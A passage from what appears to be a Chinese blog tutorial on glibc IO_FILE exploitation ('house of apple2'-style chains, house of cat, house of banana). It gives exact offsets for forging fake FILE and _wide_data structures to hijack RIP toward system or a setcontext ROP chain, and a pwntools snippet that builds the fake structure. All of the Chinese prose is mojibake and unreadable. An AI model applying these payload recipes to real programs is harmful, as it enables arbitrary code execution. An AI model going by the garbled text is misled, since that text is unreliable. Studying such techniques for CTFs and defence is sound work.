ä¹‹åï¼Œè°ƒç”¨overflow</p><ul><li>å› ä¸ºæ˜¯å®å±•å¼€ï¼Œè¿›å…¥ <code>_IO_wfile_jumps</code> çš„ overflow å‡½æ•°ã€‚</li><li>è€Œè¿™ä¸ªå‡½æ•°æ‰§è¡Œæµå¦‚ä¸‹</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure><p>ä¸»è¦çœ‹å…¶ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œè¿™é‡Œä¸»è¦çœ‹ä½œè€…çš„å‡ æ¡è¿</p><p>é“¾1ï¼š<code>_IO_wfile_overflow</code> æ§åˆ¶å‡½æ•°æ‰§è¡Œæµï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡æŸäº›æ£€æŸ¥ã€‚ä¼ªé€ fp</p><ul><li><code>_flags</code>è®¾ç½®ä¸º<code>~(2 | 0x8 | 0x800)</code>ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶<code>rdi</code>ï¼Œè®¾ç½®ä¸º<code>0</code>å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—<code>shell</code>ï¼Œå¯è®¾ç½®ä¸º<code>  sh;</code>ï¼Œå‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</li><li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_overflow</code>å³å¯</li><li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x68) = C</code>ï¼Œæ¯”å¦‚è¯´Cä¸ºsystemå‡½æ•°</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>é“¾2ï¼š<code>_IO_wfile_underflow_mmap</code> æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ</p><ul><li><code>_flags</code>è®¾ç½®ä¸º<code>~4</code>ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶<code>rdi</code>ï¼Œè®¾ç½®ä¸º<code>0</code>å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—<code>shell</code>ï¼Œå¯è®¾ç½®ä¸º<code> sh;</code>ï¼Œæ³¨æ„å‰é¢æœ‰ä¸ªç©ºæ ¼</li><li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wfile_jumps_mmap</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_underflow_mmap</code>å³å¯</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>ï¼Œå³æ»¡è¶³<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>ï¼Œå³æ»¡è¶³<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code>è®¾ç½®ä¸º<code>0</code>æˆ–è€…åˆæ³•çš„å¯è¢«<code>free</code>çš„åœ°å€ï¼Œå³æ»¡è¶³<code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x68) = C</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>é“¾3ï¼š<code>_IO_wdefault_xsgetn</code> æ§åˆ¶å‡½æ•°æ‰§è¡Œæµ</p><ul><li><code>_flags</code>è®¾ç½®ä¸º<code>0x800</code></li><li><code>vtable</code>è®¾ç½®ä¸º<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wdefault_xsgetn</code>å³å¯</li><li><code>_mode</code>è®¾ç½®ä¸ºå¤§äº<code>0</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>A</code>ï¼Œå³æ»¡è¶³<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>è®¾ç½®ä¸º<code>0</code>ï¼Œå³æ»¡è¶³<code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>ï¼Œå³æ»¡è¶³<code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code>è®¾ç½®ä¸ºå¯æ§å †åœ°å€<code>B</code>ï¼Œå³æ»¡è¶³<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>è®¾ç½®ä¸ºåœ°å€<code>C</code>ç”¨äºåŠ«æŒ<code>RIP</code>ï¼Œå³æ»¡è¶³<code>*(B + 0x18) = C</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼šä½¿ç”¨Â <code>largebin attack</code>Â åŠ«æŒ<code>_IO_list_all</code>Â å˜é‡</p><ul><li>å°†å…¶æ›¿æ¢ä¸ºä¸€ä¸ªä¼ªé€ çš„Â <code>IO_FILE</code>Â ç»“æ„ä½“ï¼ˆæŸä¸ªæˆ‘ä»¬å¯æ§å†…å®¹çš„å †ï¼‰</li><li>IO_FILEçš„ <code>_wide_data</code> ä¼ªé€ ä¸ºå¯æ§çš„å †åœ°å€ç©ºé—´ï¼Œè¿›è€Œæ§åˆ¶<code>_wide_data-&gt;_wide_vtable</code>ä¸ºå¯æ§çš„å †åœ°å€ç©ºé—´</li><li>IO_FILEçš„ <code>vtable</code> ä¼ªé€ ä¸º <code>_IO_wfile_jumps</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª const å˜é‡, gdbä½¿ç”¨<code>p &amp;_IO_wfile_jumps</code>æŸ¥çœ‹</li><li>åœ¨éœ€è¦å†™shellcodeæ—¶ï¼Œå°†Cè®¾ç½®ä¸ºä¸€ä¸ªå†™æ»¡ROPçš„å †åœ°å€å°±è¡Œã€‚å¸¸ä½¿ç”¨setcontext</li></ul><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>å‡½æ•°è°ƒç”¨é“¾</p><ul><li><code>_IO_wfile_jumps</code>ä¸­çš„<code>_IO_wfile_seekoff</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥åˆ°<code>_IO_switch_to_wget_mode</code>å‡½æ•°ä¸­æ¥æ”»å‡»</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">â€‹__fxprintf</span><br><span class="line">â€‹locked_vfxprintf</span><br><span class="line">__vfprintf_internal #åœ¨è¿™é‡Œæ˜¯è·³è½¬åˆ°IO_validate_vtableé€šè¿‡vtable+<span class="number">0x38</span>è°ƒç”¨çš„ä¸‹é¢å‡½æ•°</span><br><span class="line">â€‹_IO_wfile_seekoff</span><br><span class="line">_IO_switch_to_wget_mode</span><br><span class="line">â€‹call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#raxæ˜¯ä¼ªé€ çš„io_fileçš„åœ°å€</span></span><br></pre></td></tr></table></figure><p>å¹¶ä¸”house of catåœ¨<strong>FSOP</strong>çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œåªéœ€ä¿®æ”¹è™šè¡¨æŒ‡é’ˆçš„åç§»æ¥è°ƒç”¨<code>_IO_wfile_seekoff</code>å³å¯ï¼ˆé€šå¸¸æ˜¯ç»“åˆ<code>__malloc_assert</code>ï¼Œæ”¹vtableä¸º<code>_IO_wfile_jumps+0x10</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè°ƒç”¨ <code>_wide_data</code> é‡Œçš„ <code>vtableçš„_overflow</code>ï¼ŒJUMPå® ä¸”æ²¡æœ‰æ£€æŸ¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure><p>åœ¨<code>_IO_switch_to_wget_mode</code> è°ƒè¯•æ—¶å‘ç°å¦‚ä¸‹çš„æ±‡ç¼–ä»£ç </p><ul><li>rdi æ˜¯ fp æŒ‡é’ˆï¼Œæ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ çš„ä¸€ä¸ª IO_FILEã€‚</li><li>é€šè¿‡ rdiæ§åˆ¶ raxï¼Œåœ¨é€šè¿‡raxæ§åˆ¶rdxï¼Œä¹Ÿå¯ä»¥è¿‡jbeæŒ‡ä»¤ã€‚ä»è€Œæœ€åcall æˆ‘ä»¬æŒ‡å®šçš„shellcode</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åçš„ä¼ªé€ å¦‚ä¸‹</p><ul><li>rax1 ä¸ºä¸Šé¢çš„rax</li><li>rax2 ä¸ºä¸‹é¢çš„raxå¯„å­˜å™¨</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>ä¸æ˜¯ä¸€ç§æ”»å‡»IO_FILEçš„åˆ©ç”¨æ‰‹æ®µã€‚ç¨‹åºé€šè¿‡exité€€å‡ºæ—¶ï¼Œä¼šè°ƒç”¨ä¸€ä¸ªåå« <code>rtld_global</code> çš„ç»“æ„ä½“ä¸­çš„ä¸€ç³»åˆ—å‡½æ•°æ¥è¿›è¡Œè¯¸å¦‚æ¢å¤å¯„å­˜å™¨ï¼Œæ¸…é™¤ç¼“å†²åŒºç­‰æ“ä½œã€‚</p><ul><li>å¯ä»¥ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆé€šå¸¸ä½¿ç”¨Â <code>large bin attack</code>ï¼‰</li><li>èƒ½å¤Ÿä»Â <code>main</code>Â å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨Â <code>exit</code>Â å‡½æ•°</li><li>å¯ä»¥æ³„éœ²Â <code>libc</code>Â åœ°å€å’Œå †åœ°å€</li></ul><p>gdb å¸¸ç”¨çš„æŒ‡ä»¤</p><ul><li>è¿™æ˜¯ld.so æ–‡ä»¶ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨libc.symè·å¾—åœ°å€</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure><p><code>rtld_global</code>Â ç»“æ„ä½“é‡Œé¢è£…æœ‰Â <code>_dl_ns</code>Â ç»“æ„ä½“ï¼Œé€šè¿‡æ­£å¸¸ main å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨ exit é€€å‡ºï¼Œè§¦å‘å‡½æ•°è°ƒç”¨é“¾ï¼š<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>ã€‚</p><ul><li>glibc 2.37 åçš„æºç ï¼Œå¯¹æ¯”ä¹‹å‰çš„ä¸é‚£å—ï¼Œå‘ç°ä¸»è¦çš„å˜åŒ–ä¸º <code>_dl_call_fini(l);</code>ï¼Œè·Ÿè¿›å‡½æ•°å‘ç°é™¤äº†è¾“å‡ºdebuggingä¿¡æ¯å‡½æ•°å˜äº†ï¼Œå…¶ä½™éƒ½æ²¡å˜</li><li>link map ä½¿ç”¨åŒå‘é“¾è¡¨è¿æ¥èµ·æ¥</li><li>nmaps æ˜¯ <code>maps[]</code> ä¸­å…ƒç´ ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯ <code>GL(dl_ns)[ns]._ns_loaded</code></li><li>å»ºè®®è‡ªå·±éšä¾¿å†™ä¸ªç¨‹åºï¼Œå°†å…¶ä¸­å˜é‡æ‰“å°å‡ºæ¥çœ‹çœ‹ã€‚è¿™é‡ŒåŠ è½½ä¸‹é¢çš„æ³¨é‡Šé‡Œ</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 